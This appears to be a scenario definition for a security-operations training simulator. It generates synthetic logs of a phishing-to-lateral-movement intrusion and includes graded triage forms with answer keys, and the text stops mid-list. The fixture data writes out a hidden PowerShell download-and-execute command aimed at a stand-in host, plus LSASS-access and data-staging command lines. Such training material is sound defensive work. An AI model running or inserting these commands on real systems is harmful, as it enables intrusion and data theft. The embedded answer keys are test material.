// Scenario 1. Ground truth (never sent to the analyst before closure):
// a look-alike supplier domain mails a macro-enabled invoice to three
// Finance users; one opens it; Excel launches hidden PowerShell, which
// pulls a loader DLL, persists via a Run key and beacons over HTTPS. The
// operator dumps LSASS, takes the backup service account, installs a
// service on FS01 over SMB and archives Finance shares. No exfiltration.

import { E } from '../engine/format.js';
import { fakeSha256, rng } from '../engine/rng.js';
import { account, hostNamed, dom, BINARIES as B, stablePid, UA } from '../engine/env.js';
import { b64ps } from '../engine/noise.js';
import { beacon, intervalStats, utc, daysAgo } from '../engine/common.js';

const VICTIM = account('p.nair');
const WS = hostNamed('WS-FIN-014');
const FS = hostNamed('FS01');
const RECIPIENTS = ['p.nair', 'd.okafor', 'l.brandt'].map(account);

const IOC = {
  senderAddr: 'billing@baltic-carrierlines-billing.example',
  senderDomain: 'baltic-carrierlines-billing.example',
  senderIp: '203.0.113.47',
  attachName: 'INV-88213.xlsm',
  attachHash: fakeSha256('s01-attachment'),
  stage2Host: 'cdn.freightdocs-sync.example',
  stage2Ip: '198.51.100.23',
  c2Host: 'telemetry.cloudmetric-api.example',
  c2Ip: '198.51.100.77',
  dllPath: 'C:\\Users\\p.nair\\AppData\\Roaming\\MsSync\\msync.dll',
  dllHash: fakeSha256('s01-loader-dll'),
  svcPath: 'C:\\Windows\\msync_svc.exe',
  svcHash: fakeSha256('s01-service-binary'),
  archive: 'C:\\ProgramData\\Intel\\fin_q3.7z',
};
const C2_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36';
const ATTACH_PATH = `C:\\Users\\p.nair\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\8KQ2M1ZP\\${IOC.attachName}`;
const RUN_KEY = 'HKU\\S-1-5-21-2847193360-1620517214-3396109877-1614\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MsSync';
const RUNDLL_CMD = `rundll32.exe ${IOC.dllPath},Start`;
const PS_SCRIPT = `IEX (New-Object Net.WebClient).DownloadString('http://${IOC.stage2Host}/a/update.ps1')`;
const SEVENZ_CMD = `"${B.sevenzip.path}" a -t7z -mhe=on -pQ3!fr8-export ${IOC.archive} D:\\Shares\\Finance\\Payroll D:\\Shares\\Finance\\Banking`;

const PID = { excel: 4820, ps: 6312, rundll: 7096, svc: 4412 };
const SIG = (b) => ({ sha256: b.sha256, signature: `Valid (${b.signer})` });
const SYSTEM = 'NT AUTHORITY\\SYSTEM';

// Offsets in seconds relative to the start of the shift.
const AT = {
  email: -2520, open: -2040, ps: -2012, dll: -2006, run: -2004, persist: -2002, c2: -2000, beaconWs: -1998,
  discovery: -1500, lsass: -1140, lateral: -780, svc: -773, beaconFs: -764, stage: -560, archive: -498,
};

function build({ t0, seed }) {
  const T = (off) => t0 + Math.round(off * 1000);
  const events = [];
  const add = (tags, e) => { e._tags = tags; events.push(e); };
  const r = rng(seed, 's01');
  const msgId = `<${r.hex(14)}.${r.hex(6)}@${IOC.senderDomain}>`;

  // Baseline: the backup agent runs on the workstation as svc_backup.
  add(['svc_presence'], E.winsec(T(-2655), WS.name, 4624, 'An account was successfully logged on', {
    target_user: dom('svc_backup'), logon_type: 5, auth_package: 'Negotiate', process: B.services.path, logon_id: '0x4C1F2E',
  }));
  add(['svc_presence'], E.procCreate(T(-2654.6), WS.name, {
    user: dom('svc_backup'), image: B.bkpagent.path, command_line: `"${B.bkpagent.path}" --service --job incremental`,
    pid: 2984, parent_image: B.services.path, ppid: stablePid(WS.name, 'services'), ...SIG(B.bkpagent),
  }));

  // Delivery.
  RECIPIENTS.forEach((u, i) => add(['phish_email'], E.email(T(AT.email + i * 0.4), {
    msg_id: msgId, from: IOC.senderAddr, from_name: 'Baltic Carrier Lines - Accounts', to: u.email,
    subject: 'Overdue invoice INV-88213 - final notice before service suspension', src_ip: IOC.senderIp,
    spf: 'pass', dkim: 'pass', dmarc: 'pass', attachment: IOC.attachName, attachment_sha256: IOC.attachHash,
    size: 148992, verdict: 'clean', action: 'DELIVERED',
  })));

  // Execution on WS-FIN-014.
  const U = dom(VICTIM.sam);
  add(['attach_open'], E.edr(T(AT.open - 2), WS.name, 15, 'FileCreateStreamHash', {
    user: U, image: B.outlook.path, pid: stablePid(WS.name, 'outlook'), target_filename: ATTACH_PATH, zone_id: 3, sha256: IOC.attachHash,
  }));
  add(['attach_open'], E.procCreate(T(AT.open), WS.name, {
    user: U, image: B.excel.path, command_line: `"${B.excel.path}" "${ATTACH_PATH}"`, pid: PID.excel,
    parent_image: B.outlook.path, ppid: stablePid(WS.name, 'outlook'), ...SIG(B.excel),
  }));
  add(['office_ps'], E.procCreate(T(AT.ps), WS.name, {
    user: U, image: B.powershell.path, command_line: `powershell.exe -NoP -NonI -W Hidden -Enc ${b64ps(PS_SCRIPT)}`, pid: PID.ps,
    parent_image: B.excel.path, ppid: PID.excel, ...SIG(B.powershell),
  }));
  add(['stage2'], E.dns(T(AT.ps + 1), { client_ip: WS.ip, query: IOC.stage2Host, answer: IOC.stage2Ip }));
  add(['stage2'], E.proxy(T(AT.ps + 2), {
    src_ip: WS.ip, user: U, method: 'GET', url: `http://${IOC.stage2Host}/a/update.ps1`, dest_ip: IOC.stage2Ip,
    status: 200, bytes_out: 212, bytes_in: 3912, category: 'Uncategorized', ua: '-',
  }));
  add(['stage2'], E.proxy(T(AT.ps + 5), {
    src_ip: WS.ip, user: U, method: 'GET', url: `http://${IOC.stage2Host}/a/msync.dat`, dest_ip: IOC.stage2Ip,
    status: 200, bytes_out: 208, bytes_in: 284672, category: 'Uncategorized', ua: '-',
  }));
  add(['payload'], E.edr(T(AT.dll), WS.name, 11, 'FileCreate', { user: U, image: B.powershell.path, pid: PID.ps, target_filename: IOC.dllPath, file_size: 284672 }));
  add(['payload'], E.procCreate(T(AT.run), WS.name, {
    user: U, image: B.rundll32.path, command_line: RUNDLL_CMD, pid: PID.rundll, parent_image: B.powershell.path, ppid: PID.ps, ...SIG(B.rundll32),
  }));
  add(['payload'], E.edr(T(AT.run + 0.5), WS.name, 7, 'ImageLoad', { user: U, image: B.rundll32.path, pid: PID.rundll, image_loaded: IOC.dllPath, sha256: IOC.dllHash, signature: 'Unsigned' }));
  add(['persist'], E.edr(T(AT.persist), WS.name, 13, 'RegistryValueSet', { user: U, image: B.rundll32.path, pid: PID.rundll, target_object: RUN_KEY, details: RUNDLL_CMD }));
  add(['c2', 'c2_ws'], E.edr(T(AT.c2), WS.name, 3, 'NetworkConnect', { user: U, image: B.rundll32.path, pid: PID.rundll, dest_ip: IOC.c2Ip, dest_port: 443, dest_host: IOC.c2Host }));

  // Discovery.
  const disc = [
    [0, 'whoami /all', B.whoami, 'whoami.exe /all'],
    [8, 'net group "Domain Admins" /domain', B.net, 'net.exe group "Domain Admins" /domain'],
    [20, 'nltest /dclist:AEROFREIGHT', B.nltest, 'nltest.exe /dclist:AEROFREIGHT'],
    [35, 'net view \\\\FS01 /all', B.net, 'net.exe view \\\\FS01 /all'],
    [60, 'tasklist /svc', B.tasklist, 'tasklist.exe /svc'],
  ];
  disc.forEach(([dt, cmd, bin, child], i) => {
    const cpid = 5528 + i * 32;
    add(['discovery'], E.procCreate(T(AT.discovery + dt), WS.name, { user: U, image: B.cmd.path, command_line: `cmd.exe /c ${cmd}`, pid: cpid, parent_image: B.rundll32.path, ppid: PID.rundll, ...SIG(B.cmd) }));
    add(['discovery'], E.procCreate(T(AT.discovery + dt + 0.2), WS.name, { user: U, image: bin.path, command_line: child, pid: cpid + 4, parent_image: B.cmd.path, ppid: cpid, ...SIG(bin) }));
  });

  // Credential access.
  add(['lsass'], E.edr(T(AT.lsass), WS.name, 10, 'ProcessAccess', {
    user: U, image: B.rundll32.path, pid: PID.rundll, target_image: B.lsass.path, granted_access: '0x1010',
    call_trace: 'C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|UNKNOWN(000001E2F4A30000)',
  }));

  // Lateral movement to FS01 with the backup service account.
  const lid = '0x9B3D41C';
  add(['lateral_auth'], E.winsec(T(AT.lateral), WS.name, 4648, 'A logon was attempted using explicit credentials', {
    subject_user: U, target_user: dom('svc_backup'), target_server: 'FS01', process: B.rundll32.path, pid: PID.rundll,
  }));
  add(['lateral_auth'], E.fw(T(AT.lateral + 0.4), { src_ip: WS.ip, src_port: 51544, dest_ip: FS.ip, dest_port: 445, zone: 'USERS->SERVERS', rule: 'Users-to-FileServices', bytes: 318442 }));
  add(['lateral_auth'], E.winsec(T(AT.lateral + 0.8), 'DC01', 4776, 'The domain controller attempted to validate the credentials for an account', {
    target_user: 'svc_backup', workstation: WS.name, auth_package: 'MICROSOFT_AUTHENTICATION_PACKAGE_V1_0', status: '0x0',
  }));
  add(['lateral_auth'], E.winsec(T(AT.lateral + 1), FS.name, 4624, 'An account was successfully logged on', {
    target_user: dom('svc_backup'), logon_type: 3, auth_package: 'NTLM', src_ip: WS.ip, workstation: WS.name, logon_id: lid,
  }));
  add(['lateral_auth'], E.winsec(T(AT.lateral + 1.1), FS.name, 4672, 'Special privileges assigned to new logon', {
    target_user: dom('svc_backup'), privileges: 'SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege SeImpersonatePrivilege', logon_id: lid,
  }));
  add(['lateral_exec'], E.winsec(T(AT.lateral + 3), FS.name, 5140, 'A network share object was accessed', {
    subject_user: dom('svc_backup'), src_ip: WS.ip, share_name: '\\\\*\\ADMIN$', access: 'WriteData (or AddFile)', logon_id: lid,
  }));
  add(['lateral_exec'], E.winsec(T(AT.lateral + 3.5), FS.name, 5145, 'A network share object was checked to see whether client can be granted desired access', {
    subject_user: dom('svc_backup'), src_ip: WS.ip, share_name: '\\\\*\\ADMIN$', relative_target: 'msync_svc.exe', access: 'WriteData (or AddFile)', logon_id: lid,
  }));
  add(['lateral_exec'], E.edr(T(AT.lateral + 4), FS.name, 11, 'FileCreate', { user: SYSTEM, image: 'System', pid: 4, target_filename: IOC.svcPath, file_size: 301056 }));
  add(['lateral_exec'], E.winsec(T(AT.svc - 1), FS.name, 7045, 'A service was installed in the system', {
    service_name: 'MsSyncSvc', image_path: '%SystemRoot%\\msync_svc.exe', service_account: 'LocalSystem', start_type: 'demand start',
  }, 'System'));
  add(['lateral_exec'], E.winsec(T(AT.svc - 0.8), FS.name, 4697, 'A service was installed in the system', {
    subject_user: dom('svc_backup'), service_name: 'MsSyncSvc', image_path: '%SystemRoot%\\msync_svc.exe', service_account: 'LocalSystem', logon_id: lid,
  }));
  add(['lateral_exec'], E.procCreate(T(AT.svc), FS.name, {
    user: SYSTEM, image: IOC.svcPath, command_line: IOC.svcPath, pid: PID.svc, parent_image: B.services.path, ppid: stablePid(FS.name, 'services'),
    sha256: IOC.svcHash, signature: 'Unsigned',
  }));
  add(['c2', 'c2_fs'], E.dns(T(AT.beaconFs - 2), { client_ip: FS.ip, query: IOC.c2Host, answer: IOC.c2Ip }));
  add(['c2', 'c2_fs'], E.edr(T(AT.beaconFs - 1), FS.name, 3, 'NetworkConnect', { user: SYSTEM, image: IOC.svcPath, pid: PID.svc, dest_ip: IOC.c2Ip, dest_port: 443, dest_host: IOC.c2Host }));

  // Collection and staging on FS01.
  add(['staging'], E.procCreate(T(-600), FS.name, { user: SYSTEM, image: B.cmd.path, command_line: 'cmd.exe /c dir /s /b D:\\Shares\\Finance', pid: 5120, parent_image: IOC.svcPath, ppid: PID.svc, ...SIG(B.cmd) }));
  add(['staging'], E.procCreate(T(AT.stage), FS.name, { user: SYSTEM, image: B.cmd.path, command_line: `cmd.exe /c ${SEVENZ_CMD}`, pid: 5188, parent_image: IOC.svcPath, ppid: PID.svc, ...SIG(B.cmd) }));
  add(['staging'], E.procCreate(T(AT.stage + 0.3), FS.name, { user: SYSTEM, image: B.sevenzip.path, command_line: SEVENZ_CMD, pid: 5192, parent_image: B.cmd.path, ppid: 5188, ...SIG(B.sevenzip) }));
  ['Payroll\\Payroll_2026-09.xlsx', 'Payroll\\Payroll_2026-08.xlsx', 'Payroll\\Employee_Bank_Details.xlsx', 'Banking\\Northbridge_Signatories.pdf', 'Banking\\Payment_Run_2026-10-02.csv', 'Banking\\Vendor_Bank_Master.xlsx']
    .forEach((f, i) => add(['staging'], E.winsec(T(AT.stage + 3 + i * 8), FS.name, 4663, 'An attempt was made to access an object', {
      subject_user: SYSTEM, object_name: `D:\\Shares\\Finance\\${f}`, process: B.sevenzip.path, pid: 5192, access: 'ReadData (or ListDirectory)',
    })));
  add(['staging'], E.edr(T(AT.archive), FS.name, 11, 'FileCreate', { user: SYSTEM, image: B.sevenzip.path, pid: 5192, target_filename: IOC.archive, file_size: 418331648 }));

  const periodic = [
    {
      key: 'c2-ws', start: AT.beaconWs, period: 60, jitter: 9, tags: ['c2', 'c2_ws'],
      make: (o) => beacon({ ...o, host: WS.name, ip: WS.ip, user: U, procUser: U, domain: IOC.c2Host, destIp: IOC.c2Ip, image: B.rundll32.path, pid: PID.rundll, ua: C2_UA }),
    },
    {
      key: 'c2-fs', start: AT.beaconFs, period: 60, jitter: 9, tags: ['c2', 'c2_fs'],
      make: (o) => beacon({ ...o, host: FS.name, ip: FS.ip, user: '-', procUser: SYSTEM, domain: IOC.c2Host, destIp: IOC.c2Ip, image: IOC.svcPath, pid: PID.svc, ua: C2_UA }),
    },
  ];
  return { events, periodic };
}

function beaconAlert(stream, c, tag, host, at, id) {
  const hits = stream.events.filter((e) => e.source === 'proxy' && (e._tags || []).includes(tag) && e.ts <= c.t0 + at * 1000);
  const s = intervalStats(hits);
  const u = host.kind === 'workstation' ? account(host.owner) : null;
  return {
    id, rule: 'NET-0142', severity: 'medium',
    title: `Periodic outbound connections to a newly observed domain from ${host.name}`,
    description: `${host.name} has made ${s.n} outbound HTTPS connections to ${IOC.c2Host} at a near-constant interval. The destination was first seen in this environment at ${utc(s.first)} and is not in any proxy category.`,
    entity: { host: host.name, ip: host.ip, user: u ? dom(u.sam) : 'none (machine traffic)' },
    details: [
      ['Destination', IOC.c2Host], ['Destination IP', IOC.c2Ip], ['Connections in window', String(s.n)],
      ['Mean interval', `${s.mean.toFixed(1)} s`], ['Interval std. deviation', `${s.sd.toFixed(1)} s`],
      ['First seen in environment', utc(s.first)], ['Proxy category', 'Uncategorized'],
      ['Rule logic', '20 or more connections from one source to one destination, interval coefficient of variation below 0.15, destination first seen within 24 h'],
    ],
    guidance: [
      'Identify which process on the host is generating the connections.',
      'Establish what happened on the host immediately before the first connection.',
      'Check the age and reputation of the destination.',
      'Decide whether this is authorised software telemetry or command-and-control.',
    ],
    matched: hits.slice(-20).map((e) => e.id),
    matchedTotal: hits.length,
  };
}

const opt = (value, label) => ({ value, label });

const stages = [
  { id: 'monitoring', label: 'Monitor', tier: 'L1', kind: 'monitor' },

  {
    id: 'l1_triage', label: 'L1 triage', tier: 'L1', kind: 'form', weight: 15, attempts: 1, submitLabel: 'Submit triage decision',
    intro: 'Classify the alert. Pin the log events your decision rests on, then record a verdict. Tier 1 decisions are final once submitted.',
    fields: [
      {
        id: 'verdict', type: 'single', label: 'Verdict', points: 8, summary: 'Verdict',
        options: [
          opt('fp', 'False positive: the rule matched activity it should not have'),
          opt('btp', 'Benign true positive: real activity, but authorised or expected'),
          opt('tp', 'True positive: malicious or unauthorised activity'),
          opt('unknown', 'Inconclusive: not enough data to decide'),
        ],
        key: { accept: 'tp', explain: 'The beaconing process is rundll32.exe running an unsigned DLL from a user profile, started by PowerShell that Excel launched with a hidden window and an encoded command. No legitimate software behaves this way.' },
      },
      {
        id: 'severity', type: 'single', label: 'Severity', points: 4, sets: 'severity', summary: 'Severity',
        options: [opt('low', 'Low'), opt('medium', 'Medium'), opt('high', 'High'), opt('critical', 'Critical')],
        key: { accept: { high: 1, critical: 1, medium: 0.4 }, explain: 'An interactive command-and-control channel on a Finance workstation is at least High. The rule default of Medium reflects only the network pattern, not what is producing it.' },
      },
      {
        id: 'category', type: 'single', label: 'Incident category', points: 4, summary: 'Category',
        options: [
          opt('policy', 'Policy violation / unapproved software'),
          opt('recon', 'Reconnaissance or scanning'),
          opt('phishing', 'Phishing (no execution confirmed)'),
          opt('malware_c2', 'Malware with command-and-control'),
          opt('insider', 'Insider data misuse'),
          opt('dos', 'Denial of service'),
        ],
        key: { accept: { malware_c2: 1, phishing: 0.5 }, explain: 'Code execution and an established C2 channel are confirmed, so this is past the phishing stage. Category drives the playbook and the escalation path.' },
      },
      {
        id: 'evidence', type: 'pins', label: 'Key evidence', min: 3, points: 8,
        help: 'Choose at least three pinned events. They should show more than the network pattern the alert already reported.',
        key: {
          groups: { network: ['c2', 'stage2'], execution: ['office_ps', 'payload', 'attach_open', 'persist'], delivery: ['phish_email'], later: ['discovery', 'lsass', 'lateral_auth', 'lateral_exec', 'staging'] },
          minGroups: 2, minPrecision: 0.6,
          describe: 'At least two kinds of evidence, for example the beacon connections plus the process that makes them (rundll32 loading msync.dll) or how it started (Excel launching encoded PowerShell).',
          explain: 'A triage verdict that rests only on the events the rule already matched adds nothing. Tying the traffic to the responsible process is what turns a network anomaly into a confirmed compromise.',
        },
      },
      {
        id: 'decision', type: 'single', label: 'Disposition', points: 8, summary: 'Disposition',
        options: [
          opt('close_fp', 'Close as false positive'),
          opt('close_benign', 'Close as benign / authorised'),
          opt('monitor', 'Keep at Tier 1 and continue monitoring'),
          opt('escalate', 'Escalate to Tier 2'),
        ],
        key: { accept: 'escalate', explain: 'Confirmed malicious execution exceeds Tier 1 authority. Holding it at Tier 1 gives an active operator more time on the network.' },
      },
      { id: 'note', type: 'longtext', label: 'Triage note', min: 40, points: 2, help: 'What you saw, on which host, and why you reached this verdict.', key: { explain: 'Recorded in the case file for the next tier.' } },
    ],
  },

  {
    id: 'l2_escalation', label: 'L2 escalation', tier: 'L1', kind: 'form', weight: 10, attempts: 1, submitLabel: 'Hand off to Tier 2',
    intro: 'Prepare the handoff. Tier 2 should be able to start from this package without repeating your triage.',
    fields: [
      { id: 'host', type: 'host', label: 'Affected host', points: 5, summary: 'Host', key: { accept: 'WS-FIN-014', explain: 'The alert entity and the host on which the malicious process chain runs.' } },
      { id: 'user', type: 'account', label: 'Affected account', points: 5, summary: 'Account', key: { accept: 'p.nair', explain: 'The interactive user whose session launched the chain and whose credentials the proxy logged.' } },
      {
        id: 'iocs', type: 'ioc_list', label: 'Indicators handed over', points: 10,
        help: 'Add the indicators you can already support with evidence. They are saved to the case for later tiers.',
        key: {
          must: [IOC.c2Host], wantExtra: 2,
          valid: [IOC.c2Host, IOC.c2Ip, IOC.stage2Host, IOC.stage2Ip, IOC.senderDomain, IOC.senderAddr, IOC.senderIp, IOC.attachHash, IOC.dllHash, IOC.svcHash, 'msync.dll', 'msync_svc.exe', IOC.attachName],
          explain: 'The beacon destination is the minimum. The download host decoded from the PowerShell command, the destination IP and the loader DLL hash are all available at Tier 1 and save Tier 2 time.',
        },
      },
      {
        id: 'priority', type: 'single', label: 'Escalation priority', points: 3, summary: 'Priority',
        options: [opt('p1', 'P1: respond immediately'), opt('p2', 'P2: respond within 30 minutes'), opt('p3', 'P3: respond within 4 hours'), opt('p4', 'P4: next business day')],
        key: { accept: { p1: 1, p2: 1, p3: 0.3 }, explain: 'An operator has live access to a Finance workstation. Anything slower than P2 leaves the channel open for hours.' },
      },
      {
        id: 'containment', type: 'single', label: 'Containment recommendation', points: 5, summary: 'Recommendation',
        help: 'Tier 1 cannot execute containment. Record what you recommend incident response does first.',
        options: [
          opt('reboot', 'Reboot the workstation to stop the process'),
          opt('avscan', 'Run a full antivirus scan and close if clean'),
          opt('isolate', 'Isolate the workstation with EDR network containment'),
          opt('wait', 'No action until Tier 2 completes its investigation'),
          opt('askuser', 'Ask the user to delete the email and change their password'),
        ],
        key: { accept: 'isolate', explain: 'Isolation cuts the channel while preserving memory and disk for forensics. A reboot destroys volatile evidence and the Run key restarts the implant anyway.' },
      },
      { id: 'summary', type: 'longtext', label: 'Escalation summary', min: 60, points: 2, help: 'What, where, when, and why it needs Tier 2.', key: { explain: 'Recorded in the case file for Tier 2.' } },
    ],
  },

  {
    id: 'l2_investigation', label: 'Investigation', tier: 'L2', kind: 'form', weight: 30, attempts: 3, submitLabel: 'Submit findings for review',
    intro: 'Reconstruct what happened. Each finding needs a linked pinned event that shows it. You have three review rounds; accepted findings lock, and credit falls with each round.',
    fields: [
      {
        id: 'vector', type: 'single', label: 'Initial access vector', points: 3, linkable: true,
        options: [
          opt('driveby', 'Drive-by download from a compromised website'),
          opt('phish_link', 'Phishing link to a credential-harvesting page'),
          opt('rdp', 'Brute-forced remote access (RDP / VPN)'),
          opt('phish_attach', 'Phishing email with a malicious attachment'),
          opt('usb', 'Removable media'),
          opt('supply', 'Trojanised software update'),
        ],
        key: { accept: 'phish_attach', support: ['phish_email', 'attach_open'], hint: 'Work backwards from the first malicious process: what did its parent open, and where did that file come from?', explain: 'Outlook wrote INV-88213.xlsm (Zone 3, internet origin) to its attachment cache and Excel opened it. The mail gateway logged the same file hash arriving from the look-alike sender.' },
      },
      { id: 'patient_zero', type: 'host', label: 'First compromised host', points: 3, linkable: true, key: { accept: 'WS-FIN-014', support: ['attach_open', 'office_ps', 'payload', 'persist', 'c2_ws'], hint: 'Compare first-seen times for the indicator across hosts.', explain: 'WS-FIN-014 contacted the C2 domain about 20 minutes before any other host and is where the attachment was opened.' } },
      { id: 'attach_hash', type: 'text', label: 'SHA-256 of the delivered file', points: 3, linkable: true, placeholder: '64 hex characters', key: { accept: [IOC.attachHash], norm: 'hash', support: ['phish_email', 'attach_open'], hint: 'Both the mail gateway and the endpoint record a hash for the file.', explain: 'Logged by the mail gateway (attachment_sha256) and by the endpoint when Outlook wrote the file (FileCreateStreamHash).' } },
      {
        id: 'parent', type: 'single', label: 'Process that launched the encoded PowerShell', points: 3, linkable: true,
        options: [opt('outlook.exe', 'OUTLOOK.EXE'), opt('explorer.exe', 'explorer.exe'), opt('winword.exe', 'WINWORD.EXE'), opt('opsmon-agent.exe', 'opsmon-agent.exe'), opt('excel.exe', 'EXCEL.EXE'), opt('wscript.exe', 'wscript.exe'), opt('svchost.exe', 'svchost.exe')],
        key: { accept: 'excel.exe', support: ['office_ps'], hint: 'Several hosts run encoded PowerShell. Look at the parent on the affected workstation, not the servers.', explain: 'EXCEL.EXE (PID 4820) is the parent of the hidden, encoded PowerShell. The monitoring agent also runs encoded PowerShell on servers, which is benign and decodes to health checks.' },
      },
      { id: 'stage2', type: 'text', label: 'Host the second stage was downloaded from', points: 3, linkable: true, placeholder: 'domain', key: { accept: [IOC.stage2Host], norm: 'domain', support: ['office_ps', 'stage2'], hint: 'Decode the PowerShell command, or look at what the workstation requested in the seconds after it ran.', explain: 'The encoded command decodes to a DownloadString call to this host; the proxy shows update.ps1 and a 284 KB msync.dat fetched from it.' } },
      { id: 'c2_domain', type: 'text', label: 'Command-and-control domain', points: 3, linkable: true, placeholder: 'domain', key: { accept: [IOC.c2Host], norm: 'domain', support: ['c2'], hint: 'It is the destination the alert reported.', explain: 'The destination of the periodic HTTPS connections made by rundll32.exe.' } },
      { id: 'c2_ip', type: 'text', label: 'Command-and-control IP address', points: 2, linkable: true, placeholder: 'IPv4', key: { accept: [IOC.c2Ip], norm: 'ip', support: ['c2'], hint: 'Proxy, DNS and endpoint network events all record it.', explain: 'Resolved by DNS and logged as dest_ip by the proxy and the endpoint.' } },
      {
        id: 'persistence', type: 'single', label: 'Persistence on the first host', points: 3, linkable: true,
        options: [opt('task', 'Scheduled task'), opt('service', 'New Windows service'), opt('runkey', 'Registry Run key'), opt('startup', 'Startup folder shortcut'), opt('wmi', 'WMI event subscription'), opt('none', 'None observed')],
        key: { accept: 'runkey', support: ['persist'], hint: 'Filter endpoint events on that host to the seconds after the payload first ran.', explain: 'rundll32.exe set HKCU\\…\\CurrentVersion\\Run\\MsSync to relaunch the DLL at logon. The service belongs to the second host and is execution, not persistence on this one.' },
      },
      {
        id: 'cred_access', type: 'single', label: 'Credential access technique', points: 3, linkable: true,
        options: [opt('kerberoast', 'Kerberoasting'), opt('spray', 'Password spraying'), opt('lsass', 'LSASS process memory read'), opt('ntds', 'NTDS.dit extraction from a domain controller'), opt('keylog', 'Keylogging'), opt('none', 'None observed')],
        key: { accept: 'lsass', support: ['lsass'], hint: 'How did the operator come to hold an account that the workstation user does not own?', explain: 'rundll32.exe opened lsass.exe with access mask 0x1010 from unbacked memory. The backup agent runs on this workstation as svc_backup, so that account\'s credentials were in memory.' },
      },
      {
        id: 'lateral', type: 'single', label: 'Lateral movement method', points: 3, linkable: true,
        options: [opt('rdp', 'Remote Desktop'), opt('winrm', 'PowerShell remoting (WinRM)'), opt('wmi', 'WMI remote process creation'), opt('smb_service', 'Remote service creation over SMB admin share'), opt('ssh', 'SSH'), opt('none', 'No lateral movement')],
        key: { accept: 'smb_service', support: ['lateral_exec', 'lateral_auth'], hint: 'Pivot on the C2 indicator across the fleet, then look at what happened on the other host just before its first connection.', explain: 'A binary was written to ADMIN$ on FS01 over an NTLM session as svc_backup from the workstation, then a service (MsSyncSvc) was installed and started.' },
      },
      {
        id: 'data', type: 'single', label: 'Data impact', points: 3, linkable: true,
        options: [opt('none', 'No sensitive data accessed'), opt('exfil', 'Data exfiltrated to an external host'), opt('staged', 'Data collected and staged; no exfiltration observed'), opt('encrypted', 'Data encrypted for ransom'), opt('destroyed', 'Data deleted or destroyed')],
        key: { accept: 'staged', support: ['staging'], hint: 'Follow the child processes of the implant on the second host, then check that host\'s outbound byte counts.', explain: '7z.exe archived the Payroll and Banking shares into C:\\ProgramData\\Intel\\fin_q3.7z (about 400 MB). FS01\'s only outbound traffic is sub-kilobyte beacons, so nothing has left yet.' },
      },
    ],
  },

  {
    id: 'l2_validation', label: 'Validation', tier: 'L2', kind: 'form', weight: 15, attempts: 1, submitLabel: 'Sign off validation',
    intro: 'Confirm scope before handing to incident response. This sign-off is what L3 will act on, so it is final.',
    fields: [
      {
        id: 'checks', type: 'checks', label: 'Corroboration performed', points: 4,
        help: 'Updated from the tools you have run on this case.',
        key: {
          checks: [
            { id: 'sweep', label: 'Fleet-wide sweep for the command-and-control indicator', test: (c) => c.toolRuns.some((t) => t.tool === 'sweep' && (t.input.includes('cloudmetric') || t.input === IOC.c2Ip)) },
            { id: 'rep', label: 'Reputation and registration check on the destination', test: (c) => c.toolRuns.some((t) => t.tool === 'reputation' && [IOC.c2Host, IOC.c2Ip].includes(t.input.replace(/^https?:\/\//, '').split('/')[0])) },
            { id: 'tree', label: 'Process ancestry reviewed on an affected host', test: (c) => c.toolRuns.some((t) => t.tool === 'proctree' && ['ws-fin-014', 'fs01'].includes(t.input)) },
            { id: 'sandbox', label: 'Delivered file or dropped payload detonated', test: (c) => c.toolRuns.some((t) => t.tool === 'sandbox' && [IOC.attachHash, IOC.dllHash, IOC.svcHash].includes(t.input)) },
          ],
          explain: 'Validation means the conclusion is supported by more than one independent source: fleet-wide logs, external intelligence, endpoint ancestry and dynamic analysis.',
        },
      },
      { id: 'hosts', type: 'hosts', label: 'Compromised hosts', points: 5, summary: 'Hosts', key: { set: ['WS-FIN-014', 'FS01'], explain: 'Both run an implant that beacons to the C2 domain. DC01 only validated the NTLM logon; it shows no attacker activity.' } },
      { id: 'accounts', type: 'accounts', label: 'Compromised accounts', points: 5, summary: 'Accounts', key: { set: ['p.nair', 'svc_backup'], explain: 'p.nair\'s session ran the implant with local administrator rights. svc_backup was taken from LSASS and used against FS01.' } },
      { id: 'recipients', type: 'accounts', label: 'Mailboxes that received the message', points: 3, key: { set: ['p.nair', 'd.okafor', 'l.brandt'], explain: 'The gateway delivered the same message ID to three Finance mailboxes. Two copies are unopened and still live.' } },
      {
        id: 'earliest', type: 'pin_one', label: 'Earliest event of the incident', points: 3,
        help: 'Choose the pinned event that marks the start of the incident timeline.',
        key: { accept: { phish_email: 1, attach_open: 0.6, office_ps: 0.4, stage2: 0.3, payload: 0.3 }, describe: 'The mail gateway record of the invoice email being delivered.', explain: 'The timeline starts at delivery, 8 minutes before the attachment was opened. Starting it at execution understates exposure and misses the other recipients.' },
      },
      {
        id: 'sequence', type: 'order', label: 'Order of attacker activity', points: 3,
        items: [
          { id: 'c2', label: 'Command-and-control channel established' },
          { id: 'cred', label: 'Credential access' },
          { id: 'exec', label: 'User opens the file; script interpreter launched' },
          { id: 'collect', label: 'Data collected and staged' },
          { id: 'persist', label: 'Payload written and persistence set' },
          { id: 'lateral', label: 'Lateral movement to a second host' },
          { id: 'disc', label: 'Discovery commands run' },
        ],
        key: { order: ['exec', 'persist', 'c2', 'disc', 'cred', 'lateral', 'collect'], explain: 'Taken from the event timestamps: execution, loader and Run key, first beacon, discovery about 8 minutes later, LSASS access, the FS01 logon and service, then the archive.' },
      },
      {
        id: 'attack', type: 'multi', label: 'MITRE ATT&CK techniques observed', points: 6,
        options: [
          opt('T1566.001', 'T1566.001 Spearphishing Attachment'),
          opt('T1190', 'T1190 Exploit Public-Facing Application'),
          opt('T1059.001', 'T1059.001 PowerShell'),
          opt('T1218.011', 'T1218.011 Rundll32'),
          opt('T1053.005', 'T1053.005 Scheduled Task'),
          opt('T1547.001', 'T1547.001 Registry Run Keys'),
          opt('T1110.003', 'T1110.003 Password Spraying'),
          opt('T1003.001', 'T1003.001 LSASS Memory'),
          opt('T1021.002', 'T1021.002 SMB / Windows Admin Shares'),
          opt('T1021.001', 'T1021.001 Remote Desktop Protocol'),
          opt('T1569.002', 'T1569.002 Service Execution'),
          opt('T1071.001', 'T1071.001 Web Protocols'),
          opt('T1560.001', 'T1560.001 Archive via Utility'),
          opt('T1486', 'T1486 Data Encrypted for Impact'),
